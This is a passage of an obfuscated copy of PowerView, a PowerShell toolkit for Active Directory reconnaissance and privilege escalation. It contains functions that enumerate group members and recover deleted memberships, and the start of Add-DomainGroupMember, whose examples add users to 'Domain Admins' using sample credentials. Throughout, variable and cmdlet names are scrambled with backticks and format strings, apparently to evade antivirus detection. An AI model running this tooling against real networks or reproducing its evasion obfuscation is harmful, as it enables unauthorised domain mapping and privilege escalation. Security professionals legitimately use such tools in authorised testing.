        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`ARcHSc`o`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Esult`PAgEs`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRV`ertim`ElI`M`IT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${seC`URiTy`MA`skS},

        [Switch]
        ${t`oMbstO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eDEnt`IAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sE`Ar`ChERArgu`Ments} = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if (${pSBOU`ND`parA`metERs}['Domain']) { ${S`E`ARCh`E`RargU`MentS}['Domain'] = ${D`oMaIN} }
        if (${P`Sb`oUN`DP`AraMETeRS}['LDAPFilter']) { ${sea`R`CHeRARgU`mEN`Ts}['LDAPFilter'] = ${lDa`pFilt`eR} }
        if (${pSBoUNdParAm`ET`E`RS}['SearchBase']) { ${sEARChe`RARGUM`EN`TS}['SearchBase'] = ${sE`A`RCHBaSE} }
        if (${PSBoun`D`param`eTErs}['Server']) { ${S`EA`Rc`hE`RAr`GuMents}['Server'] = ${SEr`VER} }
        if (${PSBOun`DpARA`mET`eRS}['SearchScope']) { ${Sear`cHerArg`U`MeNTs}['SearchScope'] = ${s`eArC`hsC`oPe} }
        if (${pSbo`Und`pAR`AmEte`Rs}['ResultPageSize']) { ${Sear`Ch`EraRG`UmEN`Ts}['ResultPageSize'] = ${ReSuLtpa`ge`SI`ze} }
        if (${psb`o`U`NdpA`RAmET`ERS}['ServerTimeLimit']) { ${sea`RCh`ERAR`gUme`N`TS}['ServerTimeLimit'] = ${SEr`VERtI`mE`LI`MIT} }
        if (${P`sB`ouNdpARaMet`ers}['Tombstone']) { ${SearC`hE`R`ARgUmEnts}['Tombstone'] = ${TOMB`S`TONe} }
        if (${pSbOu`N`dpaRAmET`Ers}['Credential']) { ${s`EaRch`e`Ra`RguMeNTs}['Credential'] = ${CRe`d`EnTiaL} }

        ${Ad`NAM`eAR`guMEn`Ts} = @{}
        if (${p`SBo`UN`DparamET`E`RS}['Domain']) { ${Ad`NAM`EArGumeN`TS}['Domain'] = ${do`mAIn} }
        if (${psB`OUn`DParAMe`T`eRS}['Server']) { ${aDnAmeA`R`GU`mENTs}['Server'] = ${s`E`RVEr} }
        if (${P`S`BoUnD`pARAm`ete`RS}['Credential']) { ${aDnA`MeAr`G`UmEN`Ts}['Credential'] = ${cre`D`EnT`iaL} }
    }

    PROCESS {
        ${GrOUp`s`earchER} = &("{2}{1}{0}{4}{3}" -f'inS','-Doma','Get','r','earche') @SearcherArguments
        if (${Gr`oUPSEARch`eR}) {
            if (${P`Sbo`UndPA`RaMeterS}['RecurseUsingMatchingRule']) {
                ${SE`ArCh`ErARgu`MENts}['Identity'] = ${IdEn`TITy}
                ${se`Arc`HeRarGUMEn`TS}['Raw'] = ${TR`UE}
                ${Gr`oUp} = &("{1}{2}{3}{4}{0}"-f'p','G','et-','Dom','ainGrou') @SearcherArguments

                if (-not ${GR`ouP}) {
                    &("{2}{4}{0}{3}{1}"-f'-Wa','g','Wri','rnin','te') "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    ${Gro`UPFOun`DnA`mE} = ${grO`Up}.properties.item('samaccountname')[0]
                    ${GrOu`p`FOun`ddN} = ${gRo`UP}.properties.item('distinguishedname')[0]

                    if (${PSBo`UNDPAr`Ame`TeRS}['Domain']) {
                        ${GrO`UPFouN`ddoM`AIN} = ${dOm`A`IN}
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if (${G`RouPF`o`Und`dN}) {
                            ${gro`UPFo`UND`domaiN} = ${Gr`OuP`F`oUNd`Dn}.SubString(${GRO`UpFoU`N`DDn}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{3}{0}{1}{2}"-f 'Ver','b','ose','Write-') "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    ${gR`O`UpSEAr`cH`ER}.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${GrOu`pS`EA`Rcher}.PropertiesToLoad.AddRange(('distinguishedName'))
                    ${mem`B`Ers} = ${gRo`U`pse`Ar`chER}.FindAll() | &("{1}{0}{2}{3}"-f'ch-','ForEa','Obj','ect') {${_}.Properties.distinguishedname[0]}
                }
                ${N`ULL} = ${s`EARch`E`RAr`GUmentS}.Remove('Raw')
            }
            else {
                ${I`De`NtIT`yFiltEr} = ''
                ${f`ilt`er} = ''
                ${IDEn`TI`TY} | &("{1}{0}{2}"-f'O','Where-','bject') {${_}} | &("{0}{3}{1}{2}{4}" -f 'ForEa','h-','O','c','bject') {
                    ${idE`N`TiT`yINSTANCE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                    if (${Id`en`TITY`Insta`NCE} -match '^S-1-') {
                        ${iDentit`Y`FiL`TER} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${IDe`NT`ITYi`NSTANCE} -match '^CN=') {
                        ${Id`ENTI`T`YfILT`Er} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PsboUnd`PA`RA`METE`Rs}['Domain']) -and (-not ${pSboUnD`PaRAM`E`TErs}['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            ${i`dEN`T`i`TydOmaIN} = ${i`DEN`T`it`Yin`sTaNcE}.SubString(${iD`e`N`TiT`y`InstAnCe}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{3}{1}{2}{0}"-f 'e','it','e-Verbos','Wr') "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            ${Sea`R`cHeRARg`UmeN`Ts}['Domain'] = ${IdE`Nt`i`TYDO`mAIn}
                            ${G`R`Ou`pSEA`RCHer} = &("{1}{0}{5}{4}{3}{2}" -f 'et-Do','G','r','rche','Sea','main') @SearcherArguments
                            if (-not ${G`RO`UpsEa`Rc`Her}) {
                                &("{1}{2}{0}" -f 'ng','Wri','te-Warni') "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif (${ID`ENTIty`iN`st`A`NCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${G`U`iDb`ytes`TRINg} = (([Guid]${IdEN`TI`TyINst`A`NCE}).ToByteArray() | &("{3}{1}{2}{0}{4}" -f 'ec','orEach-O','bj','F','t') { '\' + ${_}.ToString('X2') }) -join ''
                        ${I`dEN`T`IT`yFIlTEr} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${Id`EN`TitYiNSTA`Nce}.Contains('\')) {
                        ${cONve`RT`Ed`iDENt`It`yi`N`St`AnCe} = ${idEN`TIty`i`NsTAn`cE}.Replace('\28', '(').Replace('\29', ')') | &("{0}{2}{3}{1}"-f 'C','e','onve','rt-ADNam') -OutputType ("{0}{1}{2}"-f'Canon','i','cal')
                        if (${co`Nv`eR`T`Ed`IDeNtiTyiNsTaNcE}) {
                            ${g`Roup`dom`Ain} = ${co`NvEr`T`edidENTi`T`yI`NsT`ANCe}.SubString(0, ${c`Onv`ErTEdiDenTiTy`insTAn`Ce}.IndexOf('/'))
                            ${G`RouPn`Ame} = ${Id`e`N`TItyinStAN`Ce}.Split('\')[1]
                            ${idEnTi`TYFi`Lter} += "(samAccountName=$GroupName)"
                            ${SeAr`ChER`A`RgUmEntS}['Domain'] = ${GrOuPDo`m`A`IN}
                            &("{2}{0}{3}{1}"-f'erb','e','Write-V','os') "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            ${G`R`oupsEARc`heR} = &("{1}{0}{4}{3}{2}{5}"-f'e','Get-DomainS','e','ch','ar','r') @SearcherArguments
                        }
                    }
                    else {
                        ${IdE`NtItyfi`l`T`eR} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${I`DE`NtityfI`LT`er} -and (${i`D`E`NtIty`FILter}.Trim() -ne '') ) {
                    ${F`I`LTEr} += "(|$IdentityFilter)"
                }

                if (${PSBo`U`NDPA`RA`Me`TeRS}['LDAPFilter']) {
                    &("{2}{0}{3}{1}"-f 'r','e','Write-Ve','bos') "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    ${fI`L`TeR} += "$LDAPFilter"
                }

                ${Gr`oupSe`ArcHER}.filter = "(&(objectCategory=group)$Filter)"
                &("{0}{2}{1}"-f'Wri','se','te-Verbo') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    ${resu`LT} = ${gROU`PS`e`A`RCHEr}.FindOne()
                }
                catch {
                    &("{1}{2}{0}" -f 'e-Warning','Wr','it') "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    ${m`eM`BerS} = @()
                }

                ${GROuPf`Oun`Dname} = ''
                ${gROUPfO`UN`dDn} = ''

                if (${rE`sUlT}) {
                    ${ME`mbe`Rs} = ${reS`U`Lt}.properties.item('member')

                    if (${mem`BerS}.count -eq 0) {
                        # ranged searching, thanks @meatballs__ !
                        ${fi`N`IsHed} = ${fal`sE}
                        ${B`OTT`om} = 0
                        ${t`oP} = 0

                        while (-not ${F`i`N`ISHeD}) {
                            ${t`Op} = ${bOT`Tom} + 1499
                            ${mEM`Ber`Ra`NgE}="member;range=$Bottom-$Top"
                            ${bOtt`om} += 1500
                            ${NU`lL} = ${G`ROup`se`ArchEr}.PropertiesToLoad.Clear()
                            ${nU`Ll} = ${g`ROu`ps`earC`her}.PropertiesToLoad.Add("$MemberRange")
                            ${Nu`ll} = ${Gro`Ups`eArcH`er}.PropertiesToLoad.Add('samaccountname')
                            ${nu`lL} = ${gR`ouP`se`ARChER}.PropertiesToLoad.Add('distinguishedname')

                            try {
                                ${R`ESUlt} = ${gR`o`UpseA`Rc`HER}.FindOne()
                                ${raN`GEDp`R`OPeRty} = ${reSu`lT}.Properties.PropertyNames -like "member;range=*"
                                ${Me`M`BeRS} += ${RE`SULt}.Properties.item(${rA`NGe`dPRo`p`ertY})
                                ${Gr`OUPf`oUNDNamE} = ${Re`sU`Lt}.properties.item('samaccountname')[0]
                                ${G`R`oUPfou`NDdN} = ${re`sUlt}.properties.item('distinguishedname')[0]

                                if (${MEmb`ers}.count -eq 0) {
                                    ${Fi`N`ISheD} = ${t`RUE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${F`iNiSH`Ed} = ${T`RUe}
                            }
                        }
                    }
                    else {
                        ${gr`o`Up`FOundn`Ame} = ${re`sulT}.properties.item('samaccountname')[0]
                        ${gr`ouPfoU`Nd`Dn} = ${r`E`sUlT}.properties.item('distinguishedname')[0]
                        ${me`MbE`RS} += ${rE`Su`lT}.Properties.item(${ra`N`Ge`DpRoPEr`Ty})
                    }

                    if (${Psb`OUnDpA`R`AMet`eRS}['Domain']) {
                        ${GrOU`PFouN`dDom`AiN} = ${DOM`AIn}
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if (${gR`oU`PFOun`Ddn}) {
                            ${grOUP`FOUN`DdO`MA`iN} = ${G`R`o`UpfoundDn}.SubString(${g`R`OU`pFOunddn}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${M`EMB`eR} in ${mE`MbeRs}) {
                if (${re`c`URSe} -and ${U`sE`mAtC`h`IngRuLe}) {
                    ${P`ROPER`TIeS} = ${_}.Properties
                }
                else {
                    ${OBJect`SeA`Rchera`R`guments} = ${seAR`CHER`ArG`UmENts}.Clone()
                    ${ob`JEctS`eARc`HER`ArGuMeNTS}['Identity'] = ${MeMB`eR}
                    ${O`BjeCTsEaR`c`heRArg`U`m`Ents}['Raw'] = ${Tr`UE}
                    ${oBJeCTs`eARChERA`RgUm`e`NTS}['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    ${o`BJe`cT} = &("{1}{3}{4}{2}{0}" -f 'nObject','Get-','ai','D','om') @ObjectSearcherArguments
                    ${P`R`OPErTies} = ${obJ`E`Ct}.Properties
                }

                if (${Pr`OPe`R`TieS}) {
                    ${g`Rou`pMe`mBER} = &("{1}{0}{2}"-f 'ew-Obj','N','ect') ("{2}{1}{0}"-f't','ec','PSObj')
                    ${Gr`oU`pmE`MBEr} | &("{2}{0}{1}"-f 'M','ember','Add-') ("{3}{0}{1}{2}"-f'oper','t','y','Notepr') 'GroupDomain' ${Gr`OuP`F`o`UNdDoM`AiN}
                    ${GR`ouPmE`m`BeR} | &("{0}{2}{3}{1}" -f'Ad','er','d-M','emb') ("{2}{0}{1}" -f 'ert','y','Noteprop') 'GroupName' ${gro`Up`FOuNd`Na`mE}
                    ${G`RouPMEM`BER} | &("{3}{2}{0}{1}" -f'em','ber','d-M','Ad') ("{2}{1}{0}" -f'rty','pe','Notepro') 'GroupDistinguishedName' ${gr`OuPfO`UnDDn}

                    if (${prOp`eR`TIES}.objectsid) {
                        ${mEM`BE`Rsid} = ((&("{0}{2}{1}"-f'N','ect','ew-Obj') ("{7}{6}{5}{3}{4}{0}{1}{2}" -f 'i','fie','r','en','t','rityId','stem.Security.Principal.Secu','Sy') ${P`R`O`PERtIes}.objectsid[0], 0).Value)
                    }
                    else {
                        ${M`E`mBERSid} = ${n`ULL}
                    }

                    try {
                        ${mEm`BER`dN} = ${PR`o`pErTIES}.distinguishedname[0]
                        if (${MEmb`ERDN} -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not ${MemBeR`s`iD}) {
                                    ${me`mb`erSiD} = ${p`ROp`ERt`IeS}.cn[0]
                                }
                                ${MEmBEr`S`iM`Ple`NAme} = &("{2}{0}{3}{1}"-f'vert-AD','me','Con','Na') -Identity ${mem`B`erSId} -OutputType 'DomainSimple' @ADNameArguments

                                if (${mEm`BERS`Im`plE`NamE}) {
                                    ${m`e`MBERdomaIn} = ${m`eMBe`RS`I`MpLENAmE}.Split('@')[1]
                                }
                                else {
                                    &("{2}{0}{1}"-f '-Wa','rning','Write') "[Get-DomainGroupMember] Error converting $MemberDN"
                                    ${mem`BERD`OMa`in} = ${N`ULL}
                                }
                            }
                            catch {
                                &("{1}{3}{2}{0}"-f'rning','W','-Wa','rite') "[Get-DomainGroupMember] Error converting $MemberDN"
                                ${mE`mBE`Rd`OmAiN} = ${nU`LL}
                            }
                        }
                        else {
                            # extract the FQDN from the Distinguished Name
                            ${m`eM`BERdOm`AiN} = ${M`E`MBErDn}.SubString(${ME`MbE`RDn}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${MEmber`dn} = ${n`ULL}
                        ${mEMBErDOM`A`in} = ${Nu`ll}
                    }

                    if (${p`ROP`eR`TIes}.samaccountname) {
                        # forest users have the samAccountName set
                        ${M`EMbE`Rna`Me} = ${PROper`T`IeS}.samaccountname[0]
                    }
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            ${ME`m`BE`RnAme} = &("{2}{1}{0}{4}{3}"-f'rt','e','Conv','ID','From-S') -ObjectSID ${p`RO`perT`IeS}.cn[0] @ADNameArguments
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            ${MEMB`E`Rn`AME} = ${pR`Ope`RtiES}.cn[0]
                        }
                    }

                    if (${PR`O`PERTI`es}.objectclass -match 'computer') {
                        ${M`EM`Be`RObjectCL`A`Ss} = 'computer'
                    }
                    elseif (${PRop`E`RTIeS}.objectclass -match 'group') {
                        ${mEmberobjec`T`Cla`ss} = 'group'
                    }
                    elseif (${Pr`o`pe`Rties}.objectclass -match 'user') {
                        ${mE`M`BeRo`BJEctclASs} = 'user'
                    }
                    else {
                        ${MEMberob`JeC`TCL`ASS} = ${nu`lL}
                    }
                    ${grO`Up`mEm`Ber} | &("{1}{2}{0}"-f'ber','Add-M','em') ("{2}{0}{1}" -f 'eprop','erty','Not') 'MemberDomain' ${mEm`BeRd`OmAIn}
                    ${GrOUpMEm`B`ER} | &("{0}{1}{2}" -f 'Add-','Memb','er') ("{1}{0}{2}{3}"-f'rope','Notep','rt','y') 'MemberName' ${me`mBERna`me}
                    ${g`ROUPM`EmBEr} | &("{2}{1}{0}"-f'mber','-Me','Add') ("{3}{0}{1}{2}" -f'epro','pert','y','Not') 'MemberDistinguishedName' ${M`emB`erDN}
                    ${GR`oUP`m`eMBER} | &("{2}{0}{1}{3}" -f'dd','-Me','A','mber') ("{2}{1}{0}" -f'y','t','Noteproper') 'MemberObjectClass' ${mEM`B`eRoB`JEC`Tc`laSs}
                    ${gR`oUPmeM`B`Er} | &("{2}{0}{1}"-f 'be','r','Add-Mem') ("{0}{2}{1}{3}" -f'Notepr','e','op','rty') 'MemberSID' ${M`EMBER`SID}
                    ${G`RoupmEm`BEr}.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    ${G`Ro`U`pMEmBer}

                    # if we're doing manual recursion
                    if (${PSBoUNDp`AramE`T`e`Rs}['Recurse'] -and ${M`eMBe`Rdn} -and (${MEMB`ero`BjeC`TC`LASS} -match 'group')) {
                        &("{1}{0}{2}" -f 'Verbos','Write-','e') "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        ${S`E`ArchERarGUM`eNtS}['Identity'] = ${m`EMBerDN}
                        ${N`ULl} = ${S`EARcher`ARG`UMenTS}.Remove('Properties')
                        &("{2}{1}{0}{5}{4}{3}" -f'pMe','inGrou','Get-Doma','r','be','m') @SearcherArguments
                    }
                }
            }
            ${GrO`UPsEaR`c`HeR}.dispose()
        }
    }
}


function Get-`do`m`Ai`NGROuPm`embe`RdeLeT`Ed {
<#
.SYNOPSIS

Returns information on group members that were removed from the specified
group identity. Accomplished by searching the linked attribute replication
metadata for the group using Get-DomainObjectLinkedAttributeHistory.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectLinkedAttributeHistory

.DESCRIPTION

Wraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute
replication metadata for the specified group. These are cases where the
'Version' attribute of group member in the replication metadata is even.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMemberDeleted | Group-Object GroupDN

Count Name                      Group
----- ----                      -----
    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...
    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...

.EXAMPLE

Get-DomainGroupMemberDeleted "Domain Admins" -Domain testlab.local


GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T23:07:43Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T22:20:02Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 5
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.DomainGroupMemberDeleted

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${i`deNt`i`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMAIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`da`pf`IltER},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${seA`RCh`Base},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Serv`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${seaRCHS`cO`pE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`SUlTP`AgesI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`VEr`Ti`Me`liMIT},

        [Switch]
        ${t`ombStO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEd`En`Tial} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${SeAr`CHErarGUM`eN`Ts} = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   ${t`RUe}
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if (${psB`O`Undpar`A`MeTErs}['Domain']) { ${seARC`HeRArGu`meN`TS}['Domain'] = ${DOmA`In} }
        if (${pSBO`UNdP`ARaMe`TerS}['LDAPFilter']) { ${seaRCh`E`R`ArguMeNTs}['LDAPFilter'] = ${LdAP`F`i`ltER} }
        if (${P`SbOUNdPAra`MEtE`RS}['SearchBase']) { ${seaRC`heRaR`g`UM`eNts}['SearchBase'] = ${s`EaRc`H`BAse} }
        if (${P`SBOUndpA`R`AMe`TerS}['Server']) { ${sEaRc`Her`A`RGu`meNTs}['Server'] = ${S`ERv`ER} }
        if (${Ps`BOuND`pa`RAM`ETE`Rs}['SearchScope']) { ${SEa`RchERA`RGUmEn`Ts}['SearchScope'] = ${s`ea`RchsCOPe} }
        if (${psbOu`NdpA`RameTe`Rs}['ResultPageSize']) { ${SEaRCH`ERA`RGUm`en`TS}['ResultPageSize'] = ${REsul`TPA`gE`S`ize} }
        if (${Psbo`UndP`Ar`A`meteRs}['ServerTimeLimit']) { ${s`eArC`HeR`A`RGUMeNTS}['ServerTimeLimit'] = ${S`er`VE`RTIm`ELimIt} }
        if (${PSB`Ound`parA`meTers}['Tombstone']) { ${SeARc`hERa`RGUM`entS}['Tombstone'] = ${To`mbs`ToNE} }
        if (${ps`BOu`NdpARa`METERS}['Credential']) { ${Se`ARcH`era`RGuM`ENTs}['Credential'] = ${cR`EdEN`TIaL} }
    }

    PROCESS {
        if (${p`Sbo`Un`dParAME`T`Ers}['Identity']) { ${S`EArCHErar`g`UM`En`TS}['Identity'] = ${iD`enT`iTY} }

        &("{4}{2}{3}{1}{0}"-f 'nObject','i','Dom','a','Get-') @SearcherArguments | &("{3}{2}{1}{0}"-f 'Object','-','Each','For') {
            ${objec`T`dN} = ${_}.Properties['distinguishedname'][0]
            ForEach(${xMl`NO`de} in ${_}.Properties['msds-replvaluemetadata']) {
                ${TeM`p`obJ`ECT} = [xml]${xm`LN`ode} | &("{3}{2}{0}{1}"-f'O','bject','-','Select') -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction ("{2}{0}{1}"-f'len','tlyContinue','Si')
                if (${tEMP`O`BJ`eCT}) {
                    if ((${TeMp`OBje`cT}.pszAttributeName -Match 'member') -and ((${T`EMPo`B`jECT}.dwVersion % 2) -eq 0 )) {
                        ${O`UtP`UT} = &("{1}{0}{2}"-f 'je','New-Ob','ct') ("{0}{1}" -f 'P','SObject')
                        ${OUt`PUT} | &("{0}{2}{1}"-f'Add-Memb','r','e') ("{2}{1}{0}"-f 'perty','o','NotePr') 'GroupDN' ${o`B`jECTdn}
                        ${oUt`P`UT} | &("{1}{2}{3}{0}"-f'ember','A','dd-','M') ("{0}{2}{3}{1}"-f 'NotePr','erty','o','p') 'MemberDN' ${T`emp`ObJEct}.pszObjectDn
                        ${o`UTp`Ut} | &("{1}{2}{0}" -f 'Member','Add','-') ("{2}{0}{1}{3}" -f 'oteProper','t','N','y') 'TimeFirstAdded' ${temp`ObJE`CT}.ftimeCreated
                        ${O`UtPuT} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{2}{0}{1}" -f 'oteP','roperty','N') 'TimeDeleted' ${teMp`OB`je`CT}.ftimeDeleted
                        ${oU`T`put} | &("{3}{2}{0}{1}" -f 'Me','mber','d-','Ad') ("{0}{2}{1}" -f'N','ty','oteProper') 'LastOriginatingChange' ${TEM`pOB`J`Ect}.ftimeLastOriginatingChange
                        ${ou`TPut} | &("{1}{2}{0}"-f'er','Add-','Memb') ("{0}{1}{2}" -f 'NotePr','o','perty') 'TimesAdded' (${tE`MP`OBjEct}.dwVersion / 2)
                        ${O`UT`PUT} | &("{1}{2}{0}" -f'-Member','Ad','d') ("{1}{0}{3}{2}"-f 'rope','NoteP','ty','r') 'LastOriginatingDsaDN' ${TEmPO`B`jE`cT}.pszLastOriginatingDsaDN
                        ${out`P`UT}.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        ${o`UtP`Ut}
                    }
                }
                else {
                    &("{3}{0}{2}{1}" -f '-V','bose','er','Write') "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function aDd-dOmAIn`g`ROU`Pm`em`BEr {
<#
.SYNOPSIS

Adds a domain user (or group) to an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and added
to the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to add members to.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'

Adds harmj0y to 'Domain Admins' in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Adds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

Creates the 'andy' user with the specified description and password, using the specified
alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
and the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${T`RUE})]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        ${iD`EntIty},

        [Parameter(Mandatory = ${T`RUe}, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${mE`MBe`Rs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAIN},

        [Management.Automation.PSCredential]
